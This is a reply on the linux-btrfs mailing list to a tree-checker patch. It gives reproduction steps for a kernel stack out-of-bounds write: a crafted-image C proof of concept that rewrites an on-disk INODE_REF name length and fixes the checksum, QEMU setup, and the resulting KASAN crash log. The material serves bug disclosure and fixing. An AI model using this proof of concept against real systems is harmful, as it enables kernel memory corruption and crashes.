Received: from mail-pj1-f48.google.com (mail-pj1-f48.google.com [209.85.216.48])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 86FD33F4110
	for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 10:45:13 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.216.48
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1781088316; cv=none; b=RciFbZn/zln9niPxcVq3EDfJPm7TzyjnRDF2uQ1PXsXa+jplRddqv0Ct7c0ZsL1MT/cv3KoWD2it4esa5HnrZgyA0hak/rMJAQmHpijGKCP/BWxC9CqzJtPF82D9RXacxz4NGONRTHnGHfYnN5a6jIzVKjuch55iTRHMkuOCDzU=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1781088316; c=relaxed/simple;
	bh=2POz3UZ7vpYU4R3QPYTHp/cJizQvdT1A6Eq/YjtwzFA=;
	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
	 Content-Type:Content-Disposition:In-Reply-To; b=bJmUX9dO6zWfHHLpfJkrr2nBc6MXeJ87a5gbnUU13jsZca0Q96lFpyTQP6ElIZDK45wAS3mWPBESwmLDdxRS7zT3Ik2JjKPbnWK7t+y6iOIXI+C99fb3qKzg+JjqNWnj5/p8UfsVWY6tWI8ysLFJKcUlJBenXrAilj1bv8HyBKk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=XMqXXI9k; arc=none smtp.client-ip=209.85.216.48
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="XMqXXI9k"
Received: by mail-pj1-f48.google.com with SMTP id 98e67ed59e1d1-36c68964315so3282432a91.2
        for <linux-btrfs@vger.kernel.org>; Wed, 10 Jun 2026 03:45:13 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1781088313; x=1781693113; darn=vger.kernel.org;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:from:to:cc:subject:date:message-id:reply-to;
        bh=LYFMo8yXDye5597OOpptcif5x/Qa1WFZmTmbcMvJe5I=;
        b=XMqXXI9k/G8DEekudom+GS1C+He1l19Rkxq3W0Kns9eEZGUXuSlG22Oy9GfQBY98a5
         5K1zswfdqJkXvWOi4Sjw73eYDgvofl/WTqUTlu9fWTcnFzM2S8lPszQlejnjhnSUfANF
         9NnbONobgeKQ+Yd/NRC+XLNzbIEvDkIGjJqVJL1OxypxZsxFzNuSqdR1Uzcy/tOiD+Yj
         uXkeKVnPqgAuLDghLa4lVA4L8vPzW+KNtndXYVkD1dCu939k/fNNbtiqgsE1IwRr8FQY
         +9q00DBZk2Y9LSuNIy1GzI2QZRCa2PVoVt+AzP0egEZ4B41FDnrrOvc/mr/HZpjkCNgw
         giLQ==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1781088313; x=1781693113;
        h=in-reply-to:content-disposition:mime-version:references:message-id
         :subject:cc:to:from:date:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to;
        bh=LYFMo8yXDye5597OOpptcif5x/Qa1WFZmTmbcMvJe5I=;
        b=rkowxKF4FKbQ6m44710fz2IEv0DK83KrfTKG3rBjyOYFVqKrMoagmHATkvg81QTtud
         ZSKKCcT/qhALfK9n8wQggmZkmzRQEUBwroWI410L1pWJvvaec31GFBUFeNnUEMqAsrge
         ME5dld+xyBwlDbJDYj7F5mPF7+XlPF3whdaMvz/7y3MlEezjoe6G/u9DnKEjQipYRFnN
         k5wSGZ2PGMXk1n8xBEgB6LFKqn0nxw7rjS7vRt0HfNj82y6eyMLdog5WiiYa37I/QkhS
         4vclKDaUypum/+ctK/TMge2JZQTrJM0E4mt/DkGyAi0pIlzZZVWq8dtip1jcMZ38VknP
         AtHA==
X-Gm-Message-State: AOJu0YzSkApKCfmiv7PcTUjiMXTwLbfZgpCLgonsE4NYuJ59JqJB76ts
	CAvWfeGiWF6blkxzTCCe0C6O0JS2xX9lxKWfvw9ZVPHQ4Faw+9YFUvaXmqssbDf3dKA=
X-Gm-Gg: Acq92OFer3ZXVYfw80ToXW58lQ09oZe+Q+bBJqLpG734W7WvlFU+FxDbK2F8PelKqi5
	CE2k+1BbyGxPbJS5UzebmTM7C0NS8kdo8um2XzqUclEWbPxMa7LJSU9hNLFe1yQFgbyffbwT0wf
	rBjclBkWD7FupDXGRsae6zaA4CP2bhl+Mbeiw2aSLrQTnENGnXzsJsTd2Jbwh0TyxX5yojP+Rv/
	cxYbiFtlYwwxEBQtLMo5WrFgZEHQvm6rlE+0ojssE8AEv6D4o376nf1crhPrA3wTAEXpHVNNg72
	30W/f0gckmUGXQYeRLl2MLAXjedA9uhHNRl04OTNh9hkEUzYqnPC4PjZ1du/zJj1tuT8pL5DfcD
	H3wSYYcCeKYvBSV1okd3EalWAeZrr4CynoDDzr4vJyJEEM1qP0XHSwaklY3QQG2awV1g4x4wJGV
	K8foLFf9rW5KMysMVS5scdia6O/vVX4HgFjoCv+zznaRKrGAXFBczfD3x2sFBObg==
X-Received: by 2002:a17:90b:2f85:b0:36d:b680:3029 with SMTP id 98e67ed59e1d1-3751f35bda5mr7813735a91.1.1781088312299;
        Wed, 10 Jun 2026 03:45:12 -0700 (PDT)
Received: from Air.local ([198.176.50.157])
        by smtp.gmail.com with ESMTPSA id 98e67ed59e1d1-376212812ffsm2560237a91.3.2026.06.10.03.45.09
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Wed, 10 Jun 2026 03:45:11 -0700 (PDT)
Date: Wed, 10 Jun 2026 18:45:06 +0800
From: Weiming Shi <bestswngs@gmail.com>
To: linux-btrfs@vger.kernel.org
Cc: dsterba@suse.com, josef@toxicpanda.com, clm@fb.com, xmei5@asu.edu
Subject: Re: [PATCH v2] btrfs: tree-checker: validate inode_ref and root_ref
 name lengths
Message-ID: <aik0hEV6ehKx6Ldv@Air.local>
References: <20260608083509.3907960-2-bestswngs@gmail.com>
Precedence: bulk
X-Mailing-List: linux-btrfs@vger.kernel.org
List-Id: <linux-btrfs.vger.kernel.org>
List-Subscribe: <mailto:linux-btrfs+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-btrfs+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <20260608083509.3907960-2-bestswngs@gmail.com>

Reproduction:


required kernel configuration
```
CONFIG_BTRFS_FS=y
CONFIG_KASAN=y
CONFIG_KASAN_INLINE=y
ONFIG_KASAN_STACK=y
CONFIG_STACKPROTECTOR_STRONG=y
```

Steps to reproduce:

1. Create a btrfs filesystem
```
#!/bin/sh
set -e
OUT="${1:-base.img}"; SIZE="${2:-512M}"
rm -f "$OUT"; truncate -s "$SIZE" "$OUT"
mkfs.btrfs -f "$OUT" >/dev/null
echo "wrote clean btrfs image: $OUT ($SIZE)"
```

2. Then Run qemu with the image
```
qemu-system-x86_64 -enable-kvm -cpu host -m 4G -smp 2 -nographic -no-reboot \
    -kernel kernel/test-bzImage-kasan \
    -initrd env/initramfs-selfcontained.cpio.gz \
    -drive file=/tmp/base.img,if=virtio,format=raw,snapshot=on \
    -append "console=ttyS0 rdinit=/init nokaslr kasan.fault=panic"
```


3. run the PoC

```c
// Build:  gcc -O2 -static -o poc poc_selfcontained.c
// Run  :  attach a freshly `mkfs.btrfs`-ed image as DEV (default /dev/vda)

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/mount.h>
#include <sys/stat.h>
#include <sys/mman.h>

#ifndef DEV
#define DEV "/dev/vda"
#endif
#define MNT "/mnt"

#define HDR             0x65    // sizeof(struct btrfs_header)
#define ITEM            25      // sizeof(struct btrfs_item)
#define IREF            10      // sizeof(struct btrfs_inode_ref): u64 index + u16 name_len
#define SECTOR          4096
#define KEY_INODE_REF   12      // BTRFS_INODE_REF_KEY
#define TARGET_NAME_LEN 4096

static uint32_t crc32c(const uint8_t *p, size_t n)
{
	uint32_t crc = ~0u;
	for (size_t i = 0; i < n; i++) {
		crc ^= p[i];
		for (int k = 0; k < 8; k++)
			crc = (crc >> 1) ^ (0x82F63B78u & (-(int32_t)(crc & 1)));
	}
	return ~crc;
}
static uint64_t rd64(const uint8_t *p){ uint64_t v; memcpy(&v,p,8); return v; }
static uint32_t rd32(const uint8_t *p){ uint32_t v; memcpy(&v,p,4); return v; }
static void     wr32(uint8_t *p, uint32_t v){ memcpy(p,&v,4); }
static void     wr16(uint8_t *p, uint16_t v){ memcpy(p,&v,2); }

struct fh { struct file_handle h; unsigned char buf[64]; };

// Rewrite d's INODE_REF item on the raw device (every DUP copy of the leaf).
static int patch_device(const char *dev, uint64_t d_ino, uint64_t sub_ino)
{
	int fd = open(dev, O_RDWR);
	if (fd < 0) { perror("open dev"); return -1; }
	off_t sz = lseek(fd, 0, SEEK_END);
	uint8_t *m = mmap(NULL, sz, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
	if (m == MAP_FAILED) { perror("mmap"); close(fd); return -1; }

	// superblock @ 64K: magic@+0x40, fsid@+0x20, nodesize@+0x94
	const uint8_t *sb = m + 0x10000;
	if (memcmp(sb + 0x40, "_BHRfS_M", 8)) { fprintf(stderr,"bad btrfs magic\n"); return -1; }
	uint8_t fsid[16]; memcpy(fsid, sb + 0x20, 16);
	uint32_t nodesize = rd32(sb + 0x94);

	int patched = 0;
	for (off_t off = 0; off + (off_t)nodesize <= sz; off += SECTOR) {
		if (memcmp(m + off + 0x20, fsid, 16)) continue;   // same filesystem
		if (m[off + 0x64] != 0) continue;                 // leaf (level 0)
		uint32_t nritems = rd32(m + off + 0x60);
		if (!nritems || nritems > 2000) continue;

		for (uint32_t i = 0; i < nritems; i++) {
			off_t ip = off + HDR + (off_t)i * ITEM;
			if (rd64(m+ip) != d_ino || m[ip+8] != KEY_INODE_REF ||
			    rd64(m+ip+9) != sub_ino)
				continue;
			uint32_t ioff = rd32(m+ip+17), isize = rd32(m+ip+21);
			if (isize != IREF + 1) continue;              // expect the "d" entry (len 1)

			uint32_t new_size = IREF + TARGET_NAME_LEN;   // 4106
			uint32_t delta    = new_size - isize;         // 4095

			// start of the packed data region = lowest item data offset
			uint32_t data_end = nodesize;
			for (uint32_t j = 0; j < nritems; j++) {
				uint32_t o = rd32(m+off+HDR+(off_t)j*ITEM+17);
				if (o < data_end) data_end = o;
			}
			if (delta > data_end - ITEM*nritems) { fprintf(stderr,"no room\n"); continue; }

			// grow item i: shift the data of items at offset <= ioff down by delta
			uint8_t *base = m + off + HDR;
			memmove(base + data_end - delta, base + data_end,
				(ioff + isize) - data_end);
			for (uint32_t j = 0; j < nritems; j++) {
				off_t jp = off + HDR + (off_t)j * ITEM;
				uint32_t o = rd32(m+jp+17);
				if (o <= ioff) wr32(m+jp+17, o - delta);
			}
			wr32(m + ip + 21, new_size);                  // item size 11 -> 4106
			wr16(base + (ioff - delta) + 8, TARGET_NAME_LEN); // name_len 1 -> 4096

			wr32(m + off, crc32c(m + off + 0x20, nodesize - 0x20)); // leaf csum
			patched++;
			break;            // one matching item per leaf; keep scanning for DUP copies
		}
	}
	msync(m, sz, MS_SYNC);
	munmap(m, sz);
	close(fd);
	return patched;
}

int main(void)
{
	struct fh fh; int mid; struct stat st;
	uint64_t d_ino, sub_ino;

	mkdir(MNT, 0755);
	if (mount(DEV, MNT, "btrfs", 0, NULL)) { perror("mount #1"); return 1; }

	mkdir(MNT "/sub", 0755);
	if (mkdir(MNT "/sub/d", 0755)) { perror("mkdir /sub/d"); return 1; }
	stat(MNT "/sub",   &st); sub_ino = st.st_ino;
	stat(MNT "/sub/d", &st); d_ino   = st.st_ino;
	printf("[poc] created /sub/d  (sub_ino=%lu d_ino=%lu)\n",
	       (unsigned long)sub_ino, (unsigned long)d_ino);

	fh.h.handle_bytes = sizeof fh.buf;
	if (name_to_handle_at(AT_FDCWD, MNT "/sub/d", &fh.h, &mid, 0)) {
		perror("name_to_handle_at"); return 1;
	}
	printf("[poc] obtained file handle for /sub/d (%u bytes)\n", fh.h.handle_bytes);
	sync();
	umount(MNT);

	int n = patch_device(DEV, d_ino, sub_ino);
	printf("[poc] rewrote %d on-disk INODE_REF copy/ies: name_len 1 -> %d, "
	       "item 11 -> %d bytes\n", n, TARGET_NAME_LEN, IREF + TARGET_NAME_LEN);
	if (n < 1) { fprintf(stderr, "[poc] nothing patched\n"); return 1; }

	if (mount(DEV, MNT, "btrfs", 0, NULL)) { perror("mount #2"); return 1; }
	int mfd = open(MNT, O_RDONLY | O_DIRECTORY);
	if (mfd < 0) { perror("open mnt"); return 1; }

	puts("[poc] open_by_handle_at(/sub/d) -> reconnect_path -> btrfs_get_name "
	     "(expect stack-OOB on a vulnerable kernel)");
	int r = open_by_handle_at(mfd, &fh.h, O_RDONLY | O_DIRECTORY);
	if (r < 0)
		printf("[poc] open_by_handle_at: %s  -- no crash, kernel is PATCHED\n",
		       strerror(errno));
	else
		puts("[poc] open_by_handle_at succeeded (unexpected)");
	return 0;
}

```


4. Observe the crash

```
[   23.447577][  T178] BUG: KASAN: stack-out-of-bounds in read_extent_buffer+0x2b4/0x3c0
k-OOB on a vulne[   23.447983][  T178] Write of size 633 at addr ffff88810a67fbc0 by task poc/178
rable kernel)
[   23.448358][  T178]
[   23.448523][  T178] CPU: 1 UID: 0 PID: 178 Comm: poc Tainted: G        W           7.1.0-rc2+ #166 PREEMPT(lazy)  94e7405e6ff72f9547adbe151fef187ff71238a
[   23.448527][  T178] Tainted: [W]=WARN
[   23.448527][  T178] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   23.448529][  T178] Call Trace:
[   23.448530][  T178]  <TASK>
[   23.448531][  T178]  dump_stack_lvl+0x93/0x100
[   23.448535][  T178]  print_address_description.constprop.0+0x30/0x400
[   23.448537][  T178]  ? __virt_addr_valid+0x228/0x440
[   23.448540][  T178]  ? read_extent_buffer+0x2b4/0x3c0
[   23.448542][  T178]  print_report+0xc4/0x2c0
[   23.448544][  T178]  ? __virt_addr_valid+0x237/0x440
[   23.448546][  T178]  ? read_extent_buffer+0x2b4/0x3c0
[   23.448548][  T178]  kasan_report+0xf8/0x140
[   23.448550][  T178]  ? read_extent_buffer+0x2b4/0x3c0
[   23.448553][  T178]  kasan_check_range+0x119/0x200
[   23.448555][  T178]  __asan_memcpy+0x3c/0x80
[   23.448558][  T178]  read_extent_buffer+0x2b4/0x3c0
[   23.448561][  T178]  btrfs_get_name+0x333/0x600
[   23.448564][  T178]  ? __pfx_btrfs_get_name+0x40/0x40
[   23.448566][  T178]  ? __lock_acquire+0x4f9/0xc00
[   23.448570][  T178]  reconnect_one+0x17e/0x580
[   23.448572][  T178]  ? __pfx_reconnect_one+0x40/0x40
[   23.448574][  T178]  ? trace_preempt_enable+0xac/0x180
[   23.448576][  T178]  ? _raw_spin_unlock+0x2d/0x80
[   23.448578][  T178]  ? trace_preempt_on+0x2c/0x40
[   23.448581][  T178]  reconnect_path+0x20c/0x2c0
[   23.448583][  T178]  ? __pfx_vfs_dentry_acceptable+0x40/0x40
[   23.448586][  T178]  exportfs_decode_fh_raw+0x5a3/0x880
[   23.448588][  T178]  ? __pfx_exportfs_decode_fh_raw+0x40/0x40
[   23.448594][  T178]  ? __might_fault+0xad/0x140
[   23.448596][  T178]  ? __lock_release.isra.0+0x5d/0x180
[   23.448598][  T178]  ? __might_fault+0xad/0x140
[   23.448601][  T178]  handle_to_path+0x524/0x880
[   23.448603][  T178]  ? __pfx_handle_to_path+0x40/0x40
[   23.448606][  T178]  ? entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   23.448608][  T178]  ? lockdep_hardirqs_on+0x7f/0x140
[   23.448611][  T178]  ? do_handle_open+0x7e/0x200
[   23.448613][  T178]  do_handle_open+0x7e/0x200
[   23.448615][  T178]  ? __pfx_do_handle_open+0x40/0x40
[   23.448617][  T178]  ? rcu_is_watching+0x15/0xc0
[   23.448619][  T178]  ? do_syscall_64+0x129/0xf00
[   23.448621][  T178]  ? trace_preempt_enable+0xac/0x180
[   23.448623][  T178]  do_syscall_64+0x17a/0xf00
[   23.448625][  T178]  ? do_syscall_64+0x129/0xf00
[   23.448626][  T178]  ? clear_bhb_loop+0x60/0xc0
[   23.448628][  T178]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[   23.448630][  T178] RIP: 0033:0x41bf74
[   23.448632][  T178] Code: 89 02 48 c7 c0 ff ff ff ff eb b4 e8 e6 08 00 00 66 0f 1f 44 00 00 f3 0f 1e fa 80 3d ed 80 09 00 00 74 13 b8 30 01 00 00 0f 05 5
[   23.448634][  T178] RSP: 002b:00007fffce51fac8 EFLAGS: 00000202 ORIG_RAX: 0000000000000130
[   23.448636][  T178] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 000000000041bf74
[   23.448638][  T178] RDX: 0000000000010000 RSI: 00007fffce51fb30 RDI: 0000000000000003
[   23.448639][  T178] RBP: 0000000000000003 R08: 0000000000000000 R09: 0000000000000000
[   23.448640][  T178] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000102
[   23.448641][  T178] R13: 0000000000000003 R14: 00007fffce51fb30 R15: 00007fffce51fc10
[   23.448644][  T178]  </TASK>
[   23.448645][  T178]
[   23.462123][  T178] The buggy address belongs to stack of task poc/178
[   23.462403][  T178]  and is located at offset 64 in frame:
[   23.462639][  T178]  exportfs_decode_fh_raw+0x0/0x880
[   23.462860][  T178]
[   23.462961][  T178] This frame has 2 objects:
[   23.463159][  T178]  [32, 48) 'path'
[   23.463161][  T178]  [64, 320) 'nbuf'
[   23.463320][  T178]
[   23.463582][  T178] The buggy address belongs to the physical page:
[   23.463852][  T178] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x10a67f
[   23.464228][  T178] flags: 0x17ffffc0000000(node=0|zone=2|lastcpupid=0x1fffff)
[   23.464540][  T178] raw: 0017ffffc0000000 ffffea0004299fc8 ffffea0004299fc8 0000000000000000
[   23.464899][  T178] raw: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[   23.465263][  T178] page dumped because: kasan: bad access detected
[   23.465532][  T178]
[   23.465633][  T178] Memory state around the buggy address:
[   23.465869][  T178]  ffff88810a67fb80: f1 f1 f1 f1 00 00 f2 f2 00 00 00 00 00 00 00 00
[   23.466212][  T178]  ffff88810a67fc00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   23.466549][  T178] >ffff88810a67fc80: 00 00 00 00 00 00 00 00 f3 f3 f3 f3 f3 f3 f3 f3
[   23.466886][  T178]                                            ^
[   23.467152][  T178]  ffff88810a67fd00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   23.467489][  T178]  ffff88810a67fd80: f1 f1 f1 f1 00 00 00 f2 f2 f2 f2 f2 00 f3 f3 f3
[   23.467826][  T178] ==================================================================
[   23.468184][  T178] Kernel panic - not syncing: kasan.fault=panic set ...
```
